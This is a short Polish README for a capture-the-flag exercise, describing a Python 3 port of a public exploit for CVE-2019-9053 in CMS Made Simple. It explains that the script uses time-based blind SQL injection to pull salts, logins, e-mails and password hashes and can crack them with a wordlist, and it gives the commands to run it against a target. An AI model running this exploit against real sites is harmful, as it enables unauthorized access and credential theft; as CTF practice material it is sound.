# Simple CTF

Skrypt do CVE-2019-9053 w CMS Made Simple.
Autor oryginału: **Daniele Scanu @ Certimeter Group**.
Źródło: https://www.exploit-db.com/exploits/46635

Poprawiłem skrypt pod Pythona 3: nawiasy przy `print` i kodowanie do bajtów w `hashlib.md5()`.
Dodałem też sprawdzanie, czy przy `--crack` jest podana wordlista.

Skrypt używa time-based blind SQL injection. Wyciąga sól, login, e-mail i hash hasła, a z opcją `--crack` próbuje złamać hash słownikiem.

## Uruchomienie

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install requests termcolor

python3 exploit.py -u http://TARGET_IP/simple
python3 exploit.py -u http://TARGET_IP/simple --crack -w /sciezka/do/wordlist.txt
```

`-u` to adres katalogu z CMS. Jeśli wyniki są błędne, warto dopasować `TIME` w kodzie do opóźnienia serwera (domyślnie 1 sekunda).
